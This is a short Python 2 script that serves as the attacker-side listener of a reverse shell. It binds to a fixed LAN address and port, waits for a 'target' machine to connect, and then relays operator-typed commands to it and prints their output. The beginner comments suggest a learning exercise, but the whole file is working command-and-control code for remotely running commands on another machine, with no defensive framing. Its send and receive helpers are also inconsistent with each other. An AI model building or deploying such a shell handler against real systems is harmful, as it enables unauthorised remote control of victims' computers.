#!/usr/bin/python

import socket
import json

def recvall(sock):
    BUFF_SIZE = 4096 # 4 KiB
    data = b''
    while True:
        part = sock.recv(BUFF_SIZE)
        data += part
        if len(part) < BUFF_SIZE:
            # either 0 or end of data
            break
    return data

#these to functions are used to recv and send as much data as you want
def reliable_send(data):
	json_data = json.dumps(data)
	target.send(json_data)
def reliable_recv():
	data = ''
	while True:
		try:
			#try to recv the data and send it to the shell function
			data = data + target.recv(1024)
			return json.loads(data)
		#if we get a value error that means there is still some bytes left over from recving the data
		except ValueError:
			#so we continue which goes back to the while loop
			#this goes on until data the entire data has been sent
			continue

def shell():
	while True:
		command = raw_input('* Shell#-' + str(ip) + ': ')
		target.send(command)
		if command == 'q':
			break
		else:
			#recv a message after command is sent of 1024 bytes
			result = recvall(target)
			print result

def server():
	global s
	global ip
	global target
	#sets up socket AF_INET = ip conection sock stream = TCP connection
	s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
	s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)

	#binds ip address to port
	s.bind(('192.168.1.151',54321))
	#listens to connection number is how many connections to listen to
	s.listen(5)

	print '[+]Listening for Incoming Connections'

	target, ip = s.accept()
	print('[+]Connection Established From: ' + str(ip))


server()
shell()
s.close()
